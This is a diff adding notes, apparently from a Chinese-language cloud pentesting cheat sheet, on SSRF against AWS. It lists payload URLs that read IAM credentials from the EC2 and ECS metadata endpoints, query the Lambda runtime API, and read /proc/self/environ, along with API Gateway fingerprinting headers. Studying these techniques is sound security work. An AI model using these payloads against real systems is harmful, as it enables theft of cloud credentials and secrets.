@@ -1,3 +1,32 @@
+### payload 
+#### EC2
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+#### ECS
+```
+http://169.254.170.2/v2/credentials/<SOME_UUID>
+```
+
+#### lambda
+```
+http://localhost:9001/2018-06-01/runtime/invocation/next
+```
+Ref：
+- https://github.com/RhinoSecurityLabs/Cloud-Security-Research/tree/master/AWS/lambda_ssrf
+- https://salmonsec.com/cheatsheet/server_side_request_forgery#ssrf-url-for-aws-lambda
+- 
+![image](https://user-images.githubusercontent.com/30398606/164604096-a301f439-e158-4a2b-91a7-0d5cbd3dd389.png)
+
+
+### 文件系统
+```
+file:///proc/self/environ
+```
+
+
+### 简介
 ```
 对于 Amazon Linux 2 或 Amazon Linux AMI，用户名称是 ec2-user。
 
@@ -136,6 +165,18 @@ tomcat:x:91:91:Apache Tomcat:/usr/share/tomcat8:/sbin/nologin
 - [Security Overview of AWS Lambda](https://d1.awsstatic.com/whitepapers/Overview-AWS-Lambda-Security.pdf)
 - https://twitter.com/SpenGietz/status/1161317376060563456
 - https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6
+
+> Lambda API 端点仅支持基于 HTTPS 的安全连接。使用 AWS Management Console、AWS开发工具包或 Lambda API 管理 Lambda 资源时，所有通信都使用传输层安全性 (TLS) 进行加密。
+
+Ref:
+- https://docs.aws.amazon.com/zh_cn/lambda/latest/dg/security-dataprotection.html
+
+
+> If the application is exposed through Amazon API Gateway, the HTTP response headers might contain header names such as: `x-amz-apigw-id`, `x-amzn-requestid`, `x-amzn-trace-id`
+如果应用是通过API Gateway，会有一些特征响应头。
+
+Ref:
+- https://www.trendmicro.com/en_us/devops/21/g/security-for-aws-lambda-serverless-applications.html
 
 ### lambda
 常用命令：
